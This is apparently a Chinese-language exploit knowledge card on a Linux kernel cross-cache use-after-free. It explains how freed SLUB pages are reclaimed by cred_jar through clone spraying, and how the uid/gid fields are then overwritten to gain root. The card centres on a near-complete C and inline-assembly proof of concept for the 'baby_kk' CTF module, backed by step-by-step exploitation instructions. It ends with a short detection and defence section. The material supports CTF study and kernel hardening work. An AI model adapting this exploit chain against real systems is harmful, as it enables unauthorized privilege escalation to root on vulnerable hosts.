---
id: binary-pwn-kernel-cross-cache-uaf-cred-jar-clone-lpe
title: Cross-Cache UAF 到 cred_jar：SLUB 整页归还 buddy 后由 clone 的 cred 回收，UAF 改写 uid/gid 提权（5.14+ SLAB_ACCOUNT 隔离）
type: scenario
domain: binary
path: binary/pwn/kernel
technique: cross-cache-uaf-cred-jar-clone-lpe
aliases:
- Cross-Cache UAF
- cross-cache attack
- cred_jar 提权
- SLUB 页回收
- SLAB_ACCOUNT 隔离绕过
- baby_kk
- 羊城杯 challenge
- fork cred spray
tags:
- pwn
- kernel
- slub
- buddy
- cross-cache
- uaf
- cred
- lpe
- clone
- slab-account
- ctf
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V181
  verified_at: '2026-11-06T17:43:24+08:00'
  notes: 已对照原文核对：SLAB_ACCOUNT 隔离、整页归还 buddy、clone 喷 cred_jar、show 匹配 uid/gid、edit 伪造 cred 头部、pipe 闸门与 naked shellcode 均与原文一致。未复跑；原文 exp 存在 for 循环条件写反与部分 ioctl 漏传 &tmp 的笔误，卡内已给修正骨架，cred 偏移/回收条件需按目标内核核对。
---

## 一句话结论

Linux 5.14+ 的 `SLAB_ACCOUNT` 把 `cred_jar` 与 `kmalloc-*` 拆成独立缓存，UAF 对象无法直接与 `struct cred` 同缓存；此时先把漏洞缓存的大量对象全部释放，让其 SLUB 页归还 buddy system，再用 `clone/fork` 大量分配 `cred_jar` 抢回同一物理页，悬空指针就会别名到 `cred` 上——UAF 读按 uid/gid 找到目标 cred，UAF 写清零 uid/gid，子进程 `getuid()==0` 后 `execve("/bin/sh")` 完成提权。整个链是纯数据攻击，SMEP/SMAP/KPTI/KASLR 都不构成阻碍。

## 原理

- **SLUB + buddy 层级**：buddy system 以 4KB 页为单位管理物理内存；SLUB 在页上管理固定大小对象。`kmem_cache` 是缓存描述符，`kmem_cache_cpu` 是每 CPU 的 freelist/当前 slab，`kmem_cache_node` 管理该 NUMA 节点的 partial/free slab 链表。分配顺序大致是 CPU freelist → CPU partial → node partial → node free → 向 buddy 申请新页。
- **整页归还**：当一个 slab 页上的对象全部释放、且各级 partial 链表已满/满足回收条件时，SLUB 会把这张空 slab 页还给 buddy system。页回到 buddy 后，其物理页可以被任何其他 `kmem_cache` 重新取走——这是 cross-cache 的物理基础。
- **5.14+ 的隔离**：`GFP_KERNEL_ACCOUNT`/`SLAB_ACCOUNT` 会为与用户数据相关的对象创建独立的 `kmalloc-cg-*` 或专用缓存；`cred_jar` 也带 `SLAB_ACCOUNT`，因此不再与 `kmalloc-192/256` 合并（旧内核 4.4 之前 `cred_jar` 可能是 `kmalloc-192` 的 alias，5.9 前两者共享缓存）。所以“UAF 对象与 cred 同缓存、直接 fork 复用”的老套路在新内核失效，必须走页级 cross-cache。
- **迁移 UAF**：漏洞对象所在缓存被大量分配后全部释放，其 slab 页归还 buddy；接着用 `clone(CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_SIGHAND, ...)` 创建大量子进程，每个子进程在 `copy_creds` 时分配一个 `cred_jar` 对象。`cred_jar` 从 buddy 取页时很可能拿到刚归还的物理页，于是原 UAF 指针（同一虚拟地址/直接映射）现在指向某个 `struct cred`。
- **cred 数据改写**：`struct cred` 开头包含 `usage` 引用计数与 uid/gid/euid/egid 等凭证字段。用 UAF `show` 读取对象内容，按当前进程的 `getuid()/getgid()` 组成的 qword 匹配目标 cred；再用 UAF `edit` 写入 `{usage=2, uid/gid=0}`（具体偏移按目标内核 `struct cred` 布局核对），把该 cred 的凭证清零。
- **子进程检查与闸门**：`clone` 出的子进程与父进程共享内存（`CLONE_VM`），不能靠用户态变量通信；用一条 pipe 作为闸门：子进程在 naked shellcode 中先 `read(pipe[0], ...)` 阻塞，父进程完成 cred 改写后向 `pipe[1]` 写数据释放子进程；子进程执行 `getuid()`，为 0 则 `execve("/bin/sh")` 拿 root shell。
- **为什么不需要 ROP**：修改的是 cred 数据而非内核控制流，因此 SMEP（禁止内核执行用户代码）、SMAP（禁止内核访问用户数据）、KPTI（页表隔离）、KASLR（内核基址随机化）都不会阻断；不需要泄露内核基址或找 gadget。
- **噪声控制**：`fork` 会额外分配 `task_struct`、`signal_cache`、`pid`、`vmap_area` 等；用 `CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_SIGHAND` 减少文件/FS/内存/信号结构的复制，把噪声压到可接受范围；仍需绑定 CPU、控制分配数量。

## 触发条件

- 内核模块存在可读/可写的 UAF（示例 `baby_kk`：`add/edit/show/free` 四个 ioctl，free 不清空 `heap_list[index]`，`edit/show` 仍可按旧指针访问），对象大小落在通用 kmalloc 缓存。
- 目标内核为 5.14+（`SLAB_ACCOUNT` 隔离生效）；若为更老内核，`cred_jar` 可能与 kmalloc 同缓存，可直接用同缓存复用，反而更简单。
- 能大量分配/释放同一漏洞缓存的对象，使空 slab 页归还 buddy；能通过 `clone/fork` 大量分配 `cred_jar`；能绑定 CPU 降低 per-CPU freelist 噪声。
- 能通过 UAF 读识别 cred（uid/gid 模式），并通过 UAF 写修改 cred；能触发子进程 `getuid()` 检查并执行 shell。
- 不需要内核代码执行、不需要 KASLR 泄露；但需要目标允许创建大量进程/线程。

## 利用步骤

1. `sched_setaffinity` 绑定单核（示例 CPU 0），减少多核 freelist 干扰；打开漏洞设备（`/dev/baby_kk`）。
2. 大量分配漏洞对象并初始化（示例 0x500 个、每个 0x100 字节），确保覆盖多张 slab 页；随后按顺序全部释放，填满 CPU/node partial 并让空 slab 页归还 buddy。
3. 用 `clone` 创建大量子进程（`CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_SIGHAND`），让 `cred_jar` 从 buddy 取回刚释放的页；子进程在 shellcode 中阻塞于 pipe 读端。
4. 用 UAF `show` 扫描漏洞缓存的所有 index，读取对象内容；按 `((u64*)buf)[1] == (uid | gid<<32)` 等模式匹配 cred（偏移按目标 `struct cred` 核对）。
5. 找到后 UAF `edit` 写入伪造的 cred 头部（示例 `{0x2, 0}`：usage 置 2、uid/gid 清零；必要时同时处理 euid/egid/suid/sgid）。
6. 父进程向 pipe 写端写入若干字节，释放所有子进程；子进程 `getuid()` 为 0 后 `execve("/bin/sh")`，获得 root shell。
7. 若未命中：调整分配/释放数量、克隆数量、CPU 绑定与扫描顺序；必要时重复释放/喷 cred。

## PoC

漏洞原语（ioctl 第三参数结构体按目标还原；文章最终 exp 中部分 wrapper 漏传 `&tmp`，以下为修正后的骨架）：

```c
#define MAX 0x500
struct req { u8 *data; u64 size; u64 idx; };

void add(u64 idx){ struct req t={.idx=idx}; ioctl(fd,0x1111,&t); }
void del(u64 idx){ struct req t={.idx=idx}; ioctl(fd,0x2222,&t); }
void edit(u8 *data,u64 size,u64 idx){ struct req t={.idx=idx,.data=data,.size=size}; ioctl(fd,0x3333,&t); }
void show(u8 *data,u64 size,u64 idx){ struct req t={.idx=idx,.data=data,.size=size}; ioctl(fd,0x4444,&t); }
```

子进程闸门与检查（naked 汇编，避免编译器 prologue；子进程共享内存，只能用寄存器/系统调用）：

```c
__attribute__((naked)) int clone_and_check(int flags, void (*fn)(void)) {
    __asm__(
        "mov r15,rsi; xor rsi,rsi; xor rdx,rdx; xor r10,r10; xor r8,r8; xor r9,r9;"
        "mov rax,56; syscall;"          // clone
        "cmp rax,0; jnz 1f; jmp r15;"   // 子进程跳到 check_root
        "1: ret;"
    );
}

__attribute__((naked)) void check_root(void) {
    __asm__(
        "mov rdi,[check_root_pipe]; lea rsi,check_root_flag; mov rdx,1; xor rax,rax; syscall;" // read pipe 阻塞
        "mov rax,102; syscall;"          // getuid
        "cmp rax,0; jz success;"
        "lea rdi,[sleep_time]; mov rax,35; xor rsi,rsi; syscall;" // 未 root 则睡死
        "success:"
        "lea rdi,[sh]; lea rsi,[sh_arg]; xor rdx,rdx; mov rax,0x3b; syscall;" // execve /bin/sh
    );
}
```

主流程：

```c
int main(void) {
    save(); bind_cpu(0); pipe(check_root_pipe);
    fd = open("/dev/baby_kk", O_RDWR);
    u8 buf[0x100] = {0};

    for (u64 i = 0; i < MAX; i++) { add(i); edit(buf, 0x100, i); }   // 铺满 slab 页
    for (u64 i = 0; i < MAX; i++) del(i);                            // 全部释放，页归还 buddy

    for (u64 i = 0; i < MAX; i++)
        clone_and_check(CLONE_FILES|CLONE_FS|CLONE_VM|CLONE_SIGHAND, check_root); // 喷 cred_jar

    u64 fake_cred_head[2] = {0x2, 0};
    u64 uid = getuid(), gid = getgid();
    for (u64 i = 0; i < MAX; i++) {
        show(buf, 0x10, i);
        if (((u64 *)buf)[1] == (uid | (gid << 32))) {                 // 匹配 cred 的 uid/gid
            edit((u8 *)fake_cred_head, sizeof(fake_cred_head), i);    // 改 cred
            break;
        }
    }
    for (u64 i = 0; i < MAX; i++) write(check_root_pipe[1], "!", 1);  // 放行子进程
    return 0;
}
```

关键常量与匹配偏移来自文章示例（对象 0x100、索引上限 0x500、比较 qword +8）；不同内核的 `struct cred` 布局（usage/uid/gid/euid/egid 偏移）与 SLUB 回收条件不同，必须按目标 vmlinux/源码核对，不要照抄偏移。

## 变体与关联

- **同缓存 cred 变体（旧内核）**：4.4 之前 `cred_jar` 可能是 `kmalloc-192` 的 alias，5.9 前两者共享缓存；此时 UAF 对象可直接被 fork 的 cred 复用，无需整页归还，见 [[binary-pwn-kernel-babydriver-cred-struct-uaf-hijack]]。
- **其他 cross-cache 目标**：把 cred_jar 换成 `pipe_buffer`（页级 UAF/off-by-null）、`msg_msg`、`sk_buff` 等；不同目标的 spray 与字段布局不同，见 [[binary-pwn-kernel-page-level-uaf-pipe-buffer-off-by-null]]、[[binary-pwn-kernel-cve-2026-23271-perf-event-race-uaf-core-pattern-lpe]]。
- **页级风水**：用 `PF_PACKET TX_RING` 等批量分配/释放连续物理页，配合 cross-cache 提高命中率，见 [[binary-pwn-kernel-buddy-page-spray-packet-tx-ring]]。
- **替代提权**：不改 cred 也可改 `modprobe_path`/`core_pattern`/页表（Dirty Pagetable），但这些目标通常需要内核读写或 ROP，和本卡的数据-only 路径不同。
- 边界：需要目标允许大量 clone；容器/受限环境可能限制进程数；SLUB 回收条件、CPU partial 大小、`CONFIG_SLAB_FREELIST_RANDOM` 等会影响命中率，需实测调整。

## 检测与防御

- 修复根因：free 后清空指针/失效标记，使用引用计数或 RCU 延迟释放；对 ioctl 的 index/size 做严格校验。
- 内核加固：`CONFIG_SLAB_FREELIST_HARDENED/RANDOM`、`CONFIG_INIT_ON_ALLOC_DEFAULT_ON`、`CONFIG_SLAB_MERGE_DEFAULT`/`SLAB_ACCOUNT`、KASAN/KFENCE；注意这些主要提高 freelist/未初始化利用难度，cross-cache 利用的是页级回收，仍可能绕过。
- 监控：短时间内大量 clone/fork、进程 uid 突然变为 0 但无 setuid 调用、cred 对象内容异常；用 LSM/eBPF 监控 `commit_creds` 调用链与 cred 字段变化。
- 运行环境：限制容器内进程/线程数量与 `clone` 权限，缩小 cred 喷发规模；及时打内核补丁。
